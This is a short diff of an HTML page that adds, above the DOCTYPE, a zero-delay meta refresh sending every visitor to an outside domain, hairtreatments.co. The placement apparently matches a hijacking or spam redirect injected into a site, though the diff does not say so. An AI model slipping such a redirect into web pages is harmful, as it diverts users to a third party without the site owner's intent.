@@ -1,3 +1,7 @@
+<meta http-equiv="refresh" content="0; URL='http://www.hairtreatments.co/'" />
+
+
+
 <!DOCTYPE html>
 <html lang="en">
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
